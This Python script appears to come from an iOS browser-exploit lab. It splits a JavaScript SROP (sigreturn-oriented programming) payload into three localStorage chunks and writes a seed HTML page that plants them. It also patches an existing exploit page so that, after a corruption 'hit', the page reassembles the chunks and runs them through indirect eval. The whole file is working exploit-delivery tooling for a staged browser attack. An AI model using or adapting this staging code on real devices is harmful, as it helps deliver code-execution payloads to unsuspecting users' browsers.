#!/usr/bin/env python3
"""Split srop.js across n1s2a/n1s2b/n1s2c and build the split seed/stage A."""
import hashlib, json, os, re, zlib
HERE=os.path.dirname(os.path.abspath(__file__)); LAB=os.path.dirname(HERE)
PAY=os.path.join(LAB,'payload')
def split_n(data,n=3):
    k=(len(data)+n-1)//n
    return [data[i*k:(i+1)*k] for i in range(n)]
def seed_html(parts,keys,label='N1IOS_SEED_ROP'):
    vars='var '+','.join(chr(65+i) for i in range(len(parts)))+';'
    sets=';'.join(f'localStorage.setItem("{keys[i]}",{chr(65+i)})' for i in range(len(parts)))
    lens='+'.join(f'{chr(65+i)}.length' for i in range(len(parts)))
    body=('<!doctype html><html><head><meta charset="utf-8"></head><body>\n'
          '<div id="v">'+label+'</div>\n<script>try{'+vars
          + ''.join(f'{chr(65+i)}={json.dumps(parts[i])};' for i in range(len(parts)))
          + sets+';document.getElementById("v").textContent="SEED OK "+('+lens+');}'
          'catch(e){document.getElementById("v").textContent="SEED ERR "+e;}</script>\n</body></html>')
    return body
def exploit_html(H,keys,label='N1IOS_LS'):
    base=open(os.path.join(PAY,'ls_final_h200_2036.html')).read() if H==200 else open(os.path.join(PAY,'ls_final_h150_2036.html')).read()
    a=re.findall(r'<script>(.*?)</script>',base,re.S)[0]
    old=("var s2=null; try{s2=localStorage.getItem(\"n1s2\");}catch(e){}\n"
         "if(hit>=0 && s2){ try{(0,eval)(s2);}catch(e2){} }")
    new=('var s2a=null,s2b=null,s2c=null; try{s2a=localStorage.getItem("'+keys[0]+'");s2b=localStorage.getItem("'+keys[1]+'");s2c=localStorage.getItem("'+keys[2]+'");}catch(e){}\n'
         'globalThis.RESULT += " S2LEN=" + (s2a===null?-1:s2a.length) + "," + (s2b===null?-1:s2b.length) + "," + (s2c===null?-1:s2c.length);\n'
         'try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}\n'
         'if(hit>=0 && s2a && s2b && s2c){ try{(0,eval)(s2a+s2b+s2c);}catch(e2){} }')
    assert old in a, 'tail not found'
    a=a.replace(old,new,1)
    html=('<!doctype html><html><head><meta charset="utf-8"></head><body>\n'
          '<div id="v">'+label+'</div>\n<script>'+a+'</script>\n</body></html>')
    return html
if __name__=='__main__':
    for src,tag in (('srop.js','ios'),('srop_host.js','host')):
        data=open(os.path.join(PAY,src)).read(); parts=split_n(data,3)
        keys=['n1s2a','n1s2b','n1s2c']
        seed=seed_html(parts,keys)
        open(os.path.join(PAY,f'ls_seed_srop_split_{tag}.html'),'w').write(seed)
        ex=exploit_html(200,keys)
        open(os.path.join(PAY,f'ls_final_h200_split_{tag}.html'),'w').write(ex)
        print('==',tag,'total',len(data),'parts',[len(p) for p in parts])
        for i,p in enumerate(parts):
            print(f'  part{i} raw={len(p)} sha256={hashlib.sha256(p.encode()).hexdigest()}')
        print(f'  seed raw={len(seed)} zlib9={len(zlib.compress(seed.encode(),9))} sha256={hashlib.sha256(seed.encode()).hexdigest()}')
        print(f'  exploit raw={len(ex)} zlib9={len(zlib.compress(ex.encode(),9))} sha256={hashlib.sha256(ex.encode()).hexdigest()}')
